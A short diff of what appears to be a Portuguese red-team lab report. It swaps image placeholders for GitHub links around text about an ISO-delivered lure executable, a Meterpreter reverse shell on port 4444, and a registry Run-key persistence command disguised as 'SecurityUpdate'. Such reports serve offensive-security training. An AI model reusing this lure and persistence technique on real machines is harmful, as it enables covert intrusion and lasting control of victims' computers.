@@ -121,7 +121,7 @@ x86_64-w64-mingw32-g++ main.cpp resource.res -o Medidas_Paco_De_Lucia.exe \
 
 O "ouvinte" (Handler) no Metasploit foi configurado para aguardar a conexão na porta 4444.
 
-> **Figura 2:** _Momento da captura: O alvo executa o binário dentro da ISO, disparando o envio do 'Stage' (248KB) e abrindo a sessão Meterpreter._ ![Inserir 571a8867-10ba-4aaf-b4ec-8f79e8769c85 aqui]
+> **Figura 2:** _Momento da captura: O alvo executa o binário dentro da ISO, disparando o envio do 'Stage' (248KB) e abrindo a sessão Meterpreter._ ![Evidence02](https://github.com/edenzafire/Red_Team_Repo/blob/main/03_Social_Engineering/evidence/02_Relatorio/Ap%C3%B3s-ganhar-Shell.png)
 
 ---
 
@@ -144,7 +144,7 @@ DOS
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "%APPDATA%\WindowsUpdater.exe" /f
 ```
 
-> **Figura 3:** _Comandos executados via shell remota confirmando a criação da chave de persistência e a localização do novo binário oculto._ ![Inserir Persistence.jpg aqui]
+> **Figura 3:** _Comandos executados via shell remota confirmando a criação da chave de persistência e a localização do novo binário oculto._ ![Inserir Persistence.jpg aqui](https://github.com/edenzafire/Red_Team_Repo/blob/main/03_Social_Engineering/evidence/02_Relatorio/Persistence.png)
 
 ---
 
